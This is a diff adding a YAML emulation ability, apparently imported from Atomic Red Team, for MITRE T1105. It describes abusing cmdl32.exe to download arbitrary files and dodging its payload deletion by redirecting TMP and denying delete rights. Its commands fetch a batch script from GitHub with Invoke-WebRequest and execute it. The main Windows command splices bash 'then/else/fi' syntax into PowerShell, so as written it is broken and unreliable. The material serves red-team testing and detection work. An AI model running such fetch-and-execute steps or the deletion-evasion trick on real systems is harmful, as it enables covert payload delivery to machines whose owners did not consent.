@@ -1,0 +1,57 @@
+- id: d239772b-88e2-4a2e-8473-897503401bcc
+  name: Download a file with Microsoft Connection Manager Auto-Download
+  description: "Uses the cmdl32 to download arbitrary file from the internet. The\
+    \ cmdl32 package is allowed to install the profile used to launch the VPN connection.\
+    \ However, the config is modified to download the arbitary file. \nThe issue of\
+    \ cmdl32.exe detecting and deleting the payload by identifying it as not a VPN\
+    \ Servers profile is avoided by setting a temporary TMP folder and denying the\
+    \ delete permission to all files for the user.\nUpon successful execution the\
+    \ test will open calculator and Notepad executable for 10 seconds.\nreference:\n\
+    https://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\n\
+    https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html"
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1105\src\T1105.bat") {exit 0}
+          else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1105\src\T1105.bat")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat"
+          -OutFile "PathToAtomicsFolder\T1105\src\T1105.bat"; fi; "PathToAtomicsFolder\T1105\src\T1105.bat"
+          1>NUL'
+        cleanup: del /f/s/q %temp%\T1105 >nul 2>&1; rmdir /s/q %temp%\T1105 >nul 2>&1
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1105
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      Path_to_file:
+        description: Path to the Batch script
+        type: path
+        default: PathToAtomicsFolder\T1105\src\T1105.bat
+    dependencies:
+    - description: '#{Path_to_file} must exist on system.
+
+        '
+      prereq_command: 'if (Test-Path "#{Path_to_file}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{Path_to_file}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat"
+        -OutFile "#{Path_to_file}"
+
+        '
+    technique_created: '2017-05-31T21:31:16.408Z'
+    atomic_guid: d239772b-88e2-4a2e-8473-897503401bcc
+    import_timestamp: '2025-06-24T11:15:05.653491Z'
